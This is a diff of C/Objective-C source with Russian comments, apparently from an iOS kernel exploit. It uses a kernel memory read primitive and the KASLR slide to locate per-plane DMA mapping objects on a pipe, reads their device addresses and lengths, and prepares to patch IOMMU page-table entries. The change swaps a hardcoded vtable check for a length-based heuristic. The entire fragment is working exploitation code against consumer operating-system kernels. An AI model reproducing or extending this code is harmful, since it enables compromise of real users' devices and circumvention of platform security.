@@ -6683,20 +6683,31 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         // → DVA=[mapObj+0xa0] → pageIdx=DVA>>14 → walk L0/L1/L2/leaf (valid=bit0,
         // child=(e<<4)&0x3ffffffc000) → PTE. Патч ТОЛЬКО при совпадении PA-маски.
         uint64_t cmdVA = 0, dva = 0, dvaLen = 0;
-        // 1.9.181 (р.46): mapping живёт НА PIPE (не op-entry!) — прямой путь к
-        // cmd БЕЗ охоты op-entry (серия 1.9.160-176 мимо была именно поэтому):
-        // [pipe+0x88+planeIdx*8] → IODMACommand (vt 0x7afa9e8) → [cmd+0x70]=mapObj
-        // → DVA=[mapObj+0xa0]. Purge-таймера нет — ходить можно и через 400мс.
+        // 1.9.182: на pipe — четыре per-plane mapping-объекта (классы 0x7afa0c8 /
+        // 0x7afa408, НЕ 0x7afa9e8 — поэтому жёсткая проверка мимо была). Приём
+        // самоверифицирующийся: mapObj kernel-ptr + DVA!=0 + len∈{0x1000,0x4000}
+        // (размер нашей поверхности). PTE PA-маска — финальный гейт подмены.
         if (kpLooksLikeKernelPointer(pipeVA)) {
             for (uint32_t pi = 0; pi < 4 && !cmdVA; pi++) {
                 uint64_t cand = kp_untag_ptr(early_kread64(pipeVA + 0x88 + (uint64_t)pi * 8));
                 if (!kpLooksLikeKernelPointer(cand) || !kpSafeToRead(cand)) continue;
                 uint64_t cvt = kp_untag_ptr(early_kread64(cand));
                 uint64_t cFile = cvt ? cvt - kslide2 : 0;
-                kpNote(r, [NSString stringWithFormat:@"  [P2] cmd=[pipe+0x88+%u*8]=%#llx vt(file)=%#llx%@",
+                uint64_t mObj = kp_untag_ptr(early_kread64(cand + 0x70));
+                uint64_t dv2 = 0, ln2 = 0;
+                if (kpLooksLikeKernelPointer(mObj) && kpSafeToRead(mObj)) {
+                    dv2 = early_kread64(mObj + 0xa0);
+                    ln2 = early_kread64(mObj + 0xa8);
+                }
+                kpNote(r, [NSString stringWithFormat:@"  [P2] pipe+0x88[%u]: cmd=%#llx vt(file)=%#llx mapObj=%#llx DVA=%#llx len=%#llx%@",
                           pi, (unsigned long long)cand, (unsigned long long)cFile,
-                          (uint32_t)cFile == 0x7afa9e8 ? @" = IODMACommand ✓" : @""]);
-                if ((uint32_t)cFile == 0x7afa9e8) cmdVA = cand;
+                          (unsigned long long)mObj, (unsigned long long)dv2, (unsigned long long)ln2,
+                          (dv2 && (ln2 == 0x1000 || ln2 == 0x4000)) ? @" ← НАШ (len совпал) ✓" : @""]);
+                if (dv2 && (ln2 == 0x1000 || ln2 == 0x4000) && !cmdVA) {
+                    cmdVA = cand;
+                    dva = dv2;
+                    dvaLen = ln2;
+                }
             }
         }
         if (cmdVA) {
